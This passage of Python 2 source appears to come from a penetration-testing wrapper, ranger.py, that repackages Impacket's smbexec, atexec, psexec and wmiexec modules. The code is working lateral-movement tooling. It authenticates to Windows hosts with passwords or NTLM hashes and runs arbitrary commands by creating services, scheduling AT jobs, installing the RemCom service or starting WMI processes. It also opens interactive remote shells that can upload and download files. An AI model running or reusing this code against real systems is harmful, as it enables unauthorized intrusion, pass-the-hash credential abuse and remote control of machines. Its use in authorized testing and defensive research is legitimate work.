            key = '%s\x01%s' % (userName, logonDomain)
            tmpLoggedUsers.add(key)
            if not(key in self.__targets[target]['LoggedIn']):
                self.__targets[target]['LoggedIn'].add(key)
                # Are we filtering users?
                if self.__filterUsers is not None:
                    if userName in self.__filterUsers:
                        print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
                        printCRLF=True
                else:
                    print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
                    printCRLF=True

        # Let's see who logged out since last check
        for session in self.__targets[target]['LoggedIn'].copy():
            userName, logonDomain = session.split('\x01')
            if session not in tmpLoggedUsers:
                self.__targets[target]['LoggedIn'].remove(session)
                # Are we filtering users?
                if self.__filterUsers is not None:
                    if userName in self.__filterUsers:
                        print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
                        printCRLF=True
                else:
                    print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
                    printCRLF=True

        if printCRLF is True:
            print

    def stop(self):
        if self.__targetsThreadEvent is not None:
            self.__targetsThreadEvent.set()


'''
IMPACKET SMBEXEC
'''

SMBEXEC_OUTPUT_FILENAME = '__output'
SMBEXEC_BATCH_FILENAME  = 'execute.bat'
SMBEXEC_SMBSERVER_DIR   = '__tmp'
SMBEXEC_DUMMY_SHARE     = 'TMP'

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBEXEC_SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBEXEC_SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBEXEC_SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(SMBEXEC_DUMMY_SHARE)
        smbConfig.set(SMBEXEC_DUMMY_SHARE,'comment','')
        smbConfig.set(SMBEXEC_DUMMY_SHARE,'read only','no')
        smbConfig.set(SMBEXEC_DUMMY_SHARE,'share type','0')
        smbConfig.set(SMBEXEC_DUMMY_SHARE,'path',SMBEXEC_SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBEXEC_SMBSERVER_DIR)
        except Exception, e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, protocols = None,
                 username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = None, mode = None, share = None):
        if not protocols:
            protocols = PSEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = 'BTOBTO'
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__share = share
        self.__mode  = mode
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            logging.info("Trying protocol %s..." % protocol)
            logging.info("Creating service %s..." % self.__serviceName)

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos)

            self.shell = None
            try:
                if self.__mode == 'SERVER':
                    serverThread = SMBServer()
                    serverThread.daemon = True
                    serverThread.start()
                self.shell = SmbexecRemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
                self.shell.cmdloop()
                if self.__mode == 'SERVER':
                    serverThread.stop()
            except  (Exception, KeyboardInterrupt), e:
                #import traceback
                #traceback.print_exc()
                logging.critical(str(e))
                if self.shell is not None:
                    self.shell.finish()
                sys.stdout.flush()
                sys.exit(1)

class SmbexecRemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\Windows\\Temp\\' + SMBEXEC_OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + SMBEXEC_BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception, e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, SMBEXEC_DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception, e:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or mantain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer,'\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)
        else:
            fd = open(SMBEXEC_SMBSERVER_DIR + '/' + SMBEXEC_OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBEXEC_SMBSERVER_DIR + '/' + SMBEXEC_OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''

'''
IMPACKET ATEXEC
'''

class ATSVC_EXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\atsvc]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\atsvc]', 445),
        }

    def __init__(self, username = '', password = '', domain = '', hashes = None, command = None, proto = None):
        self.__username = username
        self.__password = password
        self.__protocols = ATSVC_EXEC.KNOWN_PROTOCOLS.keys()
        self.__proto = proto
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__command = command
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):

        # Try all requested protocols until one works.
        entries = []
        if "139/SMB" in self.__proto:
            protodef = (r'ncacn_np:%s[\pipe\atsvc]', 139)
            port = protodef[1]
            protocol = self.__proto
            self.atexec_run(protocol, addr, port, protodef)
        elif "445/SMB" in self.__proto:
            protodef = (r'ncacn_np:%s[\pipe\atsvc]', 445)
            port = protodef[1]
            protocol = self.__proto
            self.atexec_run(protocol, addr, port, protodef)
        else:
            for protocol in self.__protocols:
                protodef = ATSVC_EXEC.KNOWN_PROTOCOLS[protocol]
                port = protodef[1]

                logging.info("Trying protocol %s..." % protocol)
                stringbinding = protodef[0] % addr

                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_dport(port)
                if hasattr(rpctransport, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                try:
                    self.doStuff(rpctransport)
                except Exception, e:
                    logging.error(e)
                else:
                    # Got a response. No need for further iterations.
                    break

    def atexec_run(self, protocol, addr, port, protodef):
        logging.info("Trying protocol %s..." % protocol)
        stringbinding = protodef[0] % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(port)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            try:
                self.doStuff(rpctransport)
            except Exception, e:
                logging.error(e)
        else:
            # Got a response. No need for further iterations.
            sys.exit("[-] Nothing left to process")


    def doStuff(self, rpctransport):
        def output_callback(data):
            print data

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        #dce.set_max_fragment_size(16)
        dce.bind(atsvc.MSRPC_UUID_ATSVC)
        at = atsvc.DCERPCAtSvc(dce)
        tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'

        # Check [MS-TSCH] Section 2.3.4
        atInfo = atsvc.AT_INFO()
        atInfo['JobTime']            = 0
        atInfo['DaysOfMonth']        = 0
        atInfo['DaysOfWeek']         = 0
        atInfo['Flags']              = 0
        atInfo['Command']            = ndrutils.NDRUniqueStringW()
        atInfo['Command']['Data']    = ('%%COMSPEC%% /C %s > %%SYSTEMROOT%%\\Temp\\%s\x00' % (self.__command, tmpFileName)).encode('utf-16le')

        resp = at.NetrJobAdd(('\\\\%s'% rpctransport.get_dip()),atInfo)
        jobId = resp['JobID']

        #resp = at.NetrJobEnum(rpctransport.get_dip())

        # Switching context to TSS
        dce2 = dce.alter_ctx(atsvc.MSRPC_UUID_TSS)
        # Now atsvc should use that new context
        at = atsvc.DCERPCAtSvc(dce2)


        resp = at.SchRpcRun('\\At%d' % jobId)
        # On the first run, it takes a while the remote target to start executing the job
        # so I'm setting this sleep.. I don't like sleeps.. but this is just an example
        # Best way would be to check the task status before attempting to read the file
        time.sleep(3)
        # Switching back to the old ctx_id
        at = atsvc.DCERPCAtSvc(dce)
        resp = at.NetrJobDel('\\\\%s'% rpctransport.get_dip(), jobId, jobId)

        smbConnection = rpctransport.get_smb_connection()
        while True:
            try:
                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
                break
            except Exception, e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                else:
                    raise
        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
 
        dce.disconnect()

'''
IMPACKET PSEXEC
'''
class RemComMessage(Structure):
    structure = (
        ('Command','4096s=""'),
        ('WorkingDir','260s=""'),
        ('Priority','<L=0x20'),
        ('ProcessID','<L=0x01'),
        ('Machine','260s=""'),
        ('NoWait','<L=0'),
    )

class RemComResponse(Structure):
    structure = (
        ('ErrorCode','<L=0'),
        ('ReturnCode','<L=0'),
    )

RemComSTDOUT         = "RemCom_stdout"
RemComSTDIN          = "RemCom_stdin"
RemComSTDERR         = "RemCom_stderr"

lock = Lock()

class PSEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self, command, path, exeFile, copyFile, protocols = None,
                 username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = False):
        self.__username = username
        self.__password = password
        if protocols is None:
            self.__protocols = PSEXEC.KNOWN_PROTOCOLS.keys()
        else:
            self.__protocols = [protocols]
        self.__command = command
        self.__path = path
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__exeFile = exeFile
        self.__copyFile = copyFile
        self.__doKerberos = doKerberos
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        for protocol in self.__protocols:
            protodef = PSEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            logging.info("Trying protocol %s...\n" % protocol)
            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)
            #if hasattr(rpctransport,'preferred_dialect'):
            #   rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

            rpctransport.set_kerberos(self.__doKerberos)
            self.doStuff(rpctransport)

    def openPipe(self, s, tid, pipe, accessMask):
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid,pipe)
                pipeReady = True
            except:
                tries -= 1
                time.sleep(2)
                pass

        if tries == 0:
            logging.critical('Pipe not ready, aborting')
            raise

        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)

        return fid

    def doStuff(self, rpctransport):

        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception, e:
            logging.critical(str(e))
            sys.exit(1)

        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()

        try:
            unInstalled = False
            s = rpctransport.get_smb_connection()

            # We don't wanna deal with timeouts from now on.
            s.setTimeout(100000)
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
            else:
                try:
                    f = open(self.__exeFile)
                except Exception, e:
                    logging.critical(str(e))
                    sys.exit(1)
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)

            installService.install()

            if self.__exeFile is not None:
                f.close()

            # Check if we need to copy a file for execution
            if self.__copyFile is not None:
                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                # And we change the command to be executed to this filename
                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command

            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s,tid,'\RemCom_communicaton',0x12019f)

            packet = RemComMessage()
            pid = os.getpid()

            packet['Machine'] = ''.join([random.choice(string.letters) for i in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid

            s.writeNamedPipe(tid, fid_main, str(packet))

            # Here we'll store the command we type so we don't print it back ;)
            # ( I know.. globals are nasty :P )
            global LastDataSent
            LastDataSent = ''

            # Create the pipes threads
            stdin_pipe  = RemoteStdInPipe(rpctransport,'\%s%s%d' % (RemComSTDIN ,packet['Machine'],packet['ProcessID']), smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare() )
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport,'\%s%s%d' % (RemComSTDOUT,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport,'\%s%s%d' % (RemComSTDERR,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
            stderr_pipe.start()

            # And we stay here till the end
            ans = s.readNamedPipe(tid,fid_main,8)

            if len(ans):
               retCode = RemComResponse(ans)
               logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
            installService.uninstall()
            if self.__copyFile is not None:
                # We copied a file for execution, let's remove it
                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            unInstalled = True
            sys.exit(retCode['ErrorCode'])

        except SystemExit:
            raise
        except:
            if unInstalled is False:
                installService.uninstall()
                if self.__copyFile is not None:
                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            sys.stdout.flush()
            sys.exit(1)

class Pipes(Thread):
    def __init__(self, transport, pipe, permissions, share=None):
        Thread.__init__(self)
        self.server = 0
        self.transport = transport
        self.credentials = transport.get_credentials()
        self.tid = 0
        self.fid = 0
        self.share = share
        self.port = transport.get_dport()
        self.pipe = pipe
        self.permissions = permissions
        self.daemon = True

    def connectPipe(self):
        try:
            lock.acquire()
            global dialect
            #self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = SMB_DIALECT)
            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
            if self.transport.get_kerberos() is True:
                self.server.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGT=TGT, TGS=TGS)
            else:
                self.server.login(user, passwd, domain, lm, nt)
            lock.release()
            self.tid = self.server.connectTree('IPC$')

            self.server.waitNamedPipe(self.tid, self.pipe)
            self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
            self.server.setTimeout(1000000)
        except:
            logging.error("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)


class RemoteStdOutPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except Exception, e:
                pass
            else:
                try:
                    global LastDataSent
                    if ans != LastDataSent:
                        sys.stdout.write(ans)
                        sys.stdout.flush()
                    else:
                        # Don't echo what I sent, and clear it up
                        LastDataSent = ''
                    # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                    # it will give false positives tho.. we should find a better way to handle this.
                    if LastDataSent > 10:
                        LastDataSent = ''
                except:
                    pass

class RemoteStdErrPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except Exception, e:
                pass
            else:
                try:
                    sys.stderr.write(str(ans))
                    sys.stderr.flush()
                except:
                    pass

class PsexecRemoteShell(cmd.Cmd):
    def __init__(self, server, port, credentials, tid, fid, share, transport):
        cmd.Cmd.__init__(self, False)
        self.prompt = '\x08'
        self.server = server
        self.transferClient = None
        self.tid = tid
        self.fid = fid
        self.credentials = credentials
        self.share = share
        self.port = port
        self.transport = transport
        self.intro = '[!] Press help for extra shell commands'

    def connect_transferClient(self):
        #self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = SMB_DIALECT)
        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
        if self.transport.get_kerberos() is True:
            self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGT=TGT, TGS=TGS)
        else:
            self.transferClient.login(user, passwd, domain, lm, nt)

    def do_help(self, line):
        print """
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
 get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir
 ! {cmd}                    - executes a local shell cmd
""" % (self.share, self.share)
        self.send_data('\r\n', False)

    def do_shell(self, s):
        os.system(s)
        self.send_data('\r\n')

    def do_get(self, src_path):
        try:
            if self.transferClient is None:
                self.connect_transferClient()

            import ntpath
            filename = ntpath.basename(src_path)
            fh = open(filename,'wb')
            logging.info("Downloading %s\%s" % (self.share, src_path))
            self.transferClient.getFile(self.share, src_path, fh.write)
            fh.close()
        except Exception, e:
            logging.critical(str(e))
            pass

        self.send_data('\r\n')

    def do_put(self, s):
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            f = dst_path + '/' + src_file
            pathname = string.replace(f,'/','\\')
            logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
            self.transferClient.putFile(self.share, pathname, fh.read)
            fh.close()
        except Exception, e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')

    def do_lcd(self, s):
        if s == '':
            print os.getcwd()
        else:
            os.chdir(s)
        self.send_data('\r\n')

    def emptyline(self):
        self.send_data('\r\n')
        return

    def default(self, line):
        self.send_data(line+'\r\n')

    def send_data(self, data, hideOutput = True):
        if hideOutput is True:
            global LastDataSent
            LastDataSent = data
        else:
            LastDataSent = ''
        self.server.writeFile(self.tid, self.fid, data)

class RemoteStdInPipe(Pipes):
    def __init__(self, transport, pipe, permisssions, share=None):
        Pipes.__init__(self, transport, pipe, permisssions, share)

    def run(self):
        self.connectPipe()
        self.shell = PsexecRemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.share, self.transport)
        self.shell.cmdloop()
'''
IMPACKET WMIEXEC
'''
WMIEXEC_OUTPUT_FILENAME = '__'

class WMIEXEC:
    def __init__(self, command = '', username = '', password = '', domain = '', hashes = None, aesKey = None, share = None, noOutput=False, doKerberos=False):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver = True, doKerberos=self.__doKerberos)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')

        try:
            self.shell = WmiexecRemoteShell(self.__share, win32Process, smbConnection)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                self.shell.cmdloop()
        except  (Exception, KeyboardInterrupt), e:
            #import traceback
            #traceback.print_exc()
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()

class WmiexecRemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + WMIEXEC_OUTPUT_FILENAME 
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print """
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""" 

    def do_lcd(self, s):
        if s == '':
            print os.getcwd()
        else:
            os.chdir(s)

    def do_get(self, src_path):
        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath) 
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()
        except Exception, e:
            logging.error(str(e))
            os.remove(filename)
            pass

    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = string.replace(dst_path, '/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception, e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print self.__outputBuffer
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self.__pwd + '>'
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print self.__outputBuffer
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self.__pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                else:
                    #print str(e)
                    pass 
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        obj = self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''



'''
Author: Christopher Duffy
Date: July 2015
Name: ranger.py
Purpose: To encode commands that execute PowerShell scripts, also provides a wrapper for
some of the impacket examples and fixes relevant functionality

Copyright (c) 2015, Christopher Duffy All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met: * Redistributions
of source code must retain the above copyright notice, this list of conditions and
the following disclaimer. * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution. * Neither the
name of the nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY BE LIABLE FOR ANY DIRECT, INDIRECT,
